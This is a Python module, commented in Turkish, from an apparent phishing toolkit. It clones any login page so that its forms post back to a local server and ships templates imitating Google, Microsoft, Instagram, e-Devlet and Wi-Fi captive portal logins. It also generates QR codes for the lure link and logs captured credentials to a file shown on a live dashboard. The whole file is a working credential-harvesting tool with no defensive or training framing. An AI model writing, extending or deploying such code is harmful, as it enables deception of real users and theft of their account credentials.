#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
oltalama sayfası kopyalama, şablon oluşturma ve sunma modülü.

özellikler:
    - URL'den sayfa kopyalama (form yönlendirmeli)
    - dahili şablonlar (Google, Microsoft, Instagram, genel)
    - Jinja2 şablon motoru desteği
    - CSS/JS inline etme
    - QR code üretimi
    - HTTPS desteği (self-signed)
    - graceful shutdown
"""

from __future__ import annotations

import os
import shutil
import time
from pathlib import Path
from typing import Optional

from .konsol import konsol
from .sunucu import DinleyiciSunucu, SunucuYonetici
from .yardimci import (
    Yapilandirma,
    port_kontrol,
    port_sec_interaktif,
    ssl_baglami_olustur,
    url_dogrula,
    varsayilan_ip_al,
    yerel_ip_al,
    yapilandirma_yukle,
)

# ────────────────────────────── bağımlılık kontrolü ──────────────────────────────

try:
    import requests  # type: ignore[import-not-found]
    from bs4 import BeautifulSoup  # type: ignore[import-not-found]

    _REQUESTS_MEVCUT = True
except ImportError:
    _REQUESTS_MEVCUT = False

try:
    from jinja2 import Environment, FileSystemLoader

    _JINJA_MEVCUT = True
except ImportError:
    _JINJA_MEVCUT = False

try:
    import qrcode  # type: ignore[import-not-found]
    import qrcode.constants  # type: ignore[import-not-found]
    from qrcode.main import QRCode  # type: ignore[import-not-found]

    _QRCODE_MEVCUT = True
except ImportError:
    _QRCODE_MEVCUT = False


# ────────────────────────────── modül bilgisi ──────────────────────────────

MODUL_BILGI = {
    "ad": "oltalama",
    "aciklama": "oltalama sayfası oluştur ve sun",
    "giris_noktasi": "baslat",
    "komut": "oltalama",
}

# şablon dizini
SABLON_DIZINI = Path(__file__).parent / "sablonlar"

# mevcut şablonlar
SABLONLAR = {
    "1": {"ad": "genel", "aciklama": "genel oturum açma sayfası"},
    "2": {"ad": "google", "aciklama": "Google oturum açma sayfası"},
    "3": {"ad": "microsoft", "aciklama": "Microsoft oturum açma sayfası"},
    "4": {"ad": "instagram", "aciklama": "Instagram oturum açma sayfası"},
    "5": {"ad": "edevlet", "aciklama": "e-Devlet Kapısı oturum açma sayfası"},
    "6": {"ad": "wifi", "aciklama": "Wi-Fi Captive Portal doğrulama sayfası"},
}


# ────────────────────────────── sayfa kopyalama ──────────────────────────────

def sayfa_kopyala(hedef_url: str, yapilandirma: Optional[Yapilandirma] = None) -> Optional[str]:
    """hedef URL'deki sayfayı indirip, formları POST yapacak şekilde düzenler.

    Args:
        hedef_url: kopyalanacak web sayfasının URL'si
        yapilandirma: konfigürasyon nesnesi

    Returns:
        kopyalanan dosyaların bulunduğu dizin yolu veya None
    """
    if not _REQUESTS_MEVCUT:
        konsol.hata("'requests' ve 'beautifulsoup4' yüklü değil.")
        konsol.soluk("pip install requests beautifulsoup4")
        return None

    yap = yapilandirma or Yapilandirma()

    konsol.bilgi(f"sayfa kopyalanıyor: {hedef_url}")

    try:
        yanit = requests.get(
            hedef_url,
            headers={"User-Agent": yap.kullanici_ajani},
            timeout=yap.zaman_asimi,
            verify=True,
        )
        yanit.raise_for_status()
    except requests.RequestException as e:
        konsol.hata(f"sayfa alınamadı: {e}")
        return None

    corba = BeautifulSoup(yanit.text, "html.parser")

    # formları düzenle
    formlar = corba.find_all("form")
    if not formlar:
        konsol.uyari("sayfada form bulunamadı, yine de kopyalanıyor.")
    else:
        for form in formlar:
            form["action"] = "/"
            form["method"] = "post"
        konsol.basari(f"{len(formlar)} form bulundu ve yönlendirme eklendi.")

    # external CSS/JS'leri inline etmeye çalış
    _kaynaklari_inline_et(corba, hedef_url, yap)

    # kopyayı saklayacak dizin
    kaydetme_dizini = Path.cwd() / "oltalama_sayfasi"
    kaydetme_dizini.mkdir(parents=True, exist_ok=True)

    dosya_yolu = kaydetme_dizini / "index.html"
    dosya_yolu.write_text(str(corba), encoding="utf-8")

    konsol.basari("sayfa başarıyla kopyalandı.")
    return str(kaydetme_dizini)


def _kaynaklari_inline_et(
    corba: "BeautifulSoup",
    temel_url: str,
    yapilandirma: Yapilandirma,
) -> None:
    """external CSS ve JS kaynaklarını inline etmeye ve bağıntılı görselleri tam URL'ye dönüştürmeye çalışır.

    Args:
        corba: BeautifulSoup nesnesi
        temel_url: kaynakların indirileceği temel URL
        yapilandirma: konfigürasyon nesnesi
    """
    if not _REQUESTS_MEVCUT:
        return

    from urllib.parse import urljoin

    # CSS dosyalarını inline et
    for link in corba.find_all("link", rel="stylesheet"):
        href = link.get("href")
        if not href:
            continue
        tam_url = urljoin(temel_url, href)
        try:
            css_yanit = requests.get(
                tam_url,
                headers={"User-Agent": yapilandirma.kullanici_ajani},
                timeout=5,
            )
            if css_yanit.ok:
                stil_etiketi = corba.new_tag("style")
                stil_etiketi.string = css_yanit.text
                link.replace_with(stil_etiketi)
        except requests.RequestException:
            pass  # indirilemezse olduğu gibi bırak

    # JS dosyalarını inline et
    for script in corba.find_all("script", src=True):
        src = script.get("src")
        if not src:
            continue
        tam_url = urljoin(temel_url, src)
        try:
            js_yanit = requests.get(
                tam_url,
                headers={"User-Agent": yapilandirma.kullanici_ajani},
                timeout=5,
            )
            if js_yanit.ok:
                del script["src"]
                script.string = js_yanit.text
        except requests.RequestException:
            pass

    # Bağıntılı resimleri indir ve base64 Data URI olarak göm (Offline Proxy)
    import base64
    for img in corba.find_all("img", src=True):
        src = img.get("src")
        if src and not src.startswith("data:"):
            tam_url = urljoin(temel_url, src)
            try:
                img_yanit = requests.get(
                    tam_url,
                    headers={"User-Agent": yapilandirma.kullanici_ajani},
                    timeout=5,
                )
                if img_yanit.ok and img_yanit.content:
                    mime = img_yanit.headers.get("Content-Type", "image/png").split(";")[0]
                    b64_str = base64.b64encode(img_yanit.content).decode("ascii")
                    img["src"] = f"data:{mime};base64,{b64_str}"
                else:
                    img["src"] = tam_url
            except requests.RequestException:
                img["src"] = tam_url

    # Favicon ve ek kaynak bağlantılarını dönüştür
    for link in corba.find_all("link", href=True):
        href = link.get("href")
        if href and not href.startswith(("http://", "https://", "data:")):
            link["href"] = urljoin(temel_url, href)


# ────────────────────────────── şablon işlemleri ──────────────────────────────

def sablonlari_listele() -> dict[str, dict[str, str]]:
    """mevcut dahili şablonları listeler.

    Returns:
        {numara: {ad, aciklama}} eşlemesi
    """
    return SABLONLAR


def sablon_kullan(sablon_adi: str, degiskenler: Optional[dict] = None) -> Optional[str]:
    """dahili şablonu Jinja2 ile render ederek bir çalışma dizinine kopyalar.

    Args:
        sablon_adi: şablon adı (ör. "google", "microsoft")
        degiskenler: Jinja2 şablonuna geçirilecek değişkenler

    Returns:
        hazırlanmış dosyaların bulunduğu dizin yolu veya None
    """
    sablon_dizini = SABLON_DIZINI / sablon_adi
    if not sablon_dizini.is_dir():
        konsol.hata(f"şablon bulunamadı: {sablon_adi}")
        return None

    kaydetme_dizini = Path.cwd() / "oltalama_sayfasi"
    kaydetme_dizini.mkdir(parents=True, exist_ok=True)

    sablon_dosyasi = sablon_dizini / "login.html"
    if not sablon_dosyasi.exists():
        konsol.hata(f"şablon dosyası bulunamadı: {sablon_dosyasi}")
        return None

    # Jinja2 ile render et (varsa)
    if _JINJA_MEVCUT and degiskenler:
        ortam = Environment(
            loader=FileSystemLoader(str(sablon_dizini)),
            autoescape=True,
        )
        sablon = ortam.get_template("login.html")
        icerik = sablon.render(degiskenler)
    else:
        icerik = sablon_dosyasi.read_text(encoding="utf-8")

    (kaydetme_dizini / "index.html").write_text(icerik, encoding="utf-8")

    # diğer dosyaları da kopyala (CSS, JS, resimler)
    for dosya in sablon_dizini.iterdir():
        if dosya.name != "login.html" and dosya.is_file():
            shutil.copy2(str(dosya), str(kaydetme_dizini / dosya.name))

    konsol.basari(f"'{sablon_adi}' şablonu hazırlandı.")
    return str(kaydetme_dizini)


# ────────────────────────────── QR code ──────────────────────────────

def qr_olustur(url: str, dosya_adi: str = "oltalama_qr.png") -> Optional[str]:
    """verilen URL için QR code üretir ve terminale ASCII matris basar.

    Args:
        url: QR code'a dönüştürülecek URL
        dosya_adi: kaydedilecek dosya adı

    Returns:
        QR code dosyasının yolu veya None
    """
    if not _QRCODE_MEVCUT:
        konsol.uyari("QR code üretimi için 'qrcode' kütüphanesi gerekli.")
        konsol.soluk("pip install qrcode[pil]")
        return None

    try:
        qr = QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=10,
            border=4,
        )
        qr.add_data(url)
        qr.make(fit=True)
        resim = qr.make_image(fill_color="black", back_color="white")

        dosya_yolu = Path.cwd() / dosya_adi
        with open(dosya_yolu, "wb") as f:
            resim.save(f)
        konsol.basari(f"QR code oluşturuldu: {dosya_yolu}")

        # Terminal ASCII QR kodu göster
        try:
            matris = qr.get_matrix()
            konsol.vurgu("\nTerminal QR Kodu (Taratabilirsiniz):")
            for satir in matris:
                satir_str = "".join("██" if hucre else "  " for hucre in satir)
                print("   " + satir_str)
            print()
        except Exception:
            pass

        return str(dosya_yolu)
    except Exception as e:
        konsol.hata(f"QR code oluşturulamadı: {e}")
        return None


# ────────────────────────────── sunucu etkileşim döngüsü ──────────────────────────────

def sunucu_etkilesim_dongusu(yonetici: SunucuYonetici) -> None:
    """sunucu çalışırken canlı dashboard ve kullanıcı komutlarını işleyen döngü."""
    import select
    import sys
    from .yardimci import kayitlari_ayristir, rapor_olustur

    with konsol.canli_dashboard_baslat() as live:
        while True:
            try:
                if live and hasattr(live, "update"):
                    live.update(yonetici.canli_panel_olustur())

                if select.select([sys.stdin], [], [], 0.5)[0]:
                    komut = sys.stdin.readline().strip().lower()
                    if komut == "s":
                        yonetici.istatistik_goster()
                    elif komut == "l":
                        kayitlar = kayitlari_ayristir()
                        if not kayitlar:
                            konsol.uyari("henüz yakalanan kimlik bilgisi yok.")
                        else:
                            konsol.vurgu(f"--- Son Yakalanan Kimlikler ({len(kayitlar)}) ---")
                            for k in kayitlar[-5:]:
                                konsol.basari(f"[{k['zaman']}] IP: {k['ip']}")
                                if k["alanlar"]:
                                    for ak, av in k["alanlar"].items():
                                        konsol.soluk(f"   > {ak}: {av}")
                                else:
                                    konsol.soluk(f"   > {k['veri'][:80]}")
                    elif komut == "r":
                        rapor_olustur("toplanan_kimlikler.txt", "rapor.html", "html")
                    elif komut in ("q", "quit", "exit"):
                        konsol.bilgi("kullanıcı isteği ile kapatılıyor...")
                        yonetici.durdur()
                        break
            except (OSError, ValueError):
                time.sleep(1)
            except KeyboardInterrupt:
                print()
                yonetici.durdur()
                break


# ────────────────────────────── ana başlatıcı ──────────────────────────────

def baslat(
    url: Optional[str] = None,
    port: int = 8080,
    sablon: Optional[str] = None,
    https: bool = False,
    sertifika: Optional[str] = None,
    anahtar: Optional[str] = None,
    dis_url: Optional[str] = None,
) -> None:
    """oltalama sunucusunu etkileşimli veya doğrudan başlatır.

    Args:
        url: kopyalanacak sayfanın URL'si (None ise interaktif)
        port: sunucu portu
        sablon: kullanılacak dahili şablon adı
        https: HTTPS etkinleştir
        sertifika: SSL sertifika dosyası yolu
        anahtar: SSL anahtar dosyası yolu
        dis_url: dış dünyaya açık domain/URL adresi
    """
    konsol.ayirici()
    konsol.vurgu("oltalama sayfası oluşturucu")
    konsol.ayirici()

    interaktif = url is None and sablon is None

    if interaktif:
        # kaynak seçimi: URL mi, şablon mu?
        konsol.bilgi("sayfa kaynağını seçin:")
        print()
        konsol.bilgi("[1] URL'den sayfa kopyala")
        konsol.bilgi("[2] dahili şablon kullan")
        print()
        secim = konsol.girdi_al("seçiminiz", "1")

        if secim == "1":
            url_girdi = konsol.girdi_al("kopyalanacak oturum açma sayfası URL'si")
            if not url_girdi:
                konsol.hata("URL boş olamaz.")
                return
            try:
                url = url_dogrula(url_girdi)
            except ValueError as e:
                konsol.hata(str(e))
                return
        elif secim == "2":
            # şablonları göster
            konsol.ayirici()
            for numara, bilgi in SABLONLAR.items():
                konsol.bilgi(f"[{numara}] {bilgi['aciklama']}")
            print()
            sablon_secim = konsol.girdi_al("şablon numarası", "1")
            secilen = SABLONLAR.get(sablon_secim)
            if secilen is None:
                konsol.hata("geçersiz şablon seçimi.")
                return
            sablon = secilen["ad"]
        else:
            konsol.hata("geçersiz seçim.")
            return

        # port seçimi
        port = port_sec_interaktif(port)

        # HTTPS sorusu
        if konsol.onayla("HTTPS etkinleştirilsin mi?"):
            https = True

        # Dış Domain / URL sorusu (opsiyonel)
        dis_girdi = konsol.girdi_al("Dış dünya / Domain adresi (opsiyonel, ör: https://ornek.com veya ngrok URL)")
        if dis_girdi:
            dis_url = dis_girdi.strip()

    elif url:
        try:
            url = url_dogrula(url)
        except ValueError as e:
            konsol.hata(str(e))
            return

    # port kontrolü (CLI modunda)
    if not interaktif and not port_kontrol(port):
        konsol.hata(f"{port} portu zaten kullanılıyor. başka bir port deneyin.")
        return

    # sayfayı hazırla
    if url:
        yapilandirma = yapilandirma_yukle()
        kaynak_dizin = sayfa_kopyala(url, yapilandirma)
    elif sablon:
        kaynak_dizin = sablon_kullan(sablon)
    else:
        konsol.hata("URL veya şablon belirtilmedi.")
        return

    if kaynak_dizin is None:
        return

    # SSL bağlamı
    ssl_ctx = None
    if https:
        ssl_ctx = ssl_baglami_olustur(sertifika, anahtar)

    # sunucu ayarları
    yonlendirme = url if url else None

    yonetici = SunucuYonetici(
        port=port,
        ssl_baglami=ssl_ctx,
        sunucu_kok_dizini=kaynak_dizin,
        kayit_dosyasi="toplanan_kimlikler.txt",
        yonlendirme_url=yonlendirme,
    )

    yonetici.baslat(arka_plan=True)

    # bilgi çıktısı ve URL oluşturma
    protokol = "https" if ssl_ctx else "http"
    if dis_url:
        tam_url = dis_url if dis_url.startswith(("http://", "https://")) else f"{protokol}://{dis_url}"
    else:
        ip_adresi = varsayilan_ip_al()
        tam_url = f"{protokol}://{ip_adresi}:{port}"

    konsol.ayirici()
    konsol.basari(f"oltalama sayfası çalışıyor: {tam_url}")
    if dis_url:
        konsol.soluk(f"yerel dinleyici: {protokol}://0.0.0.0:{port}")
    konsol.bilgi("kimlik bilgileri → 'toplanan_kimlikler.txt'")

    # QR code üret
    qr_olustur(tam_url)

    sunucu_etkilesim_dongusu(yonetici)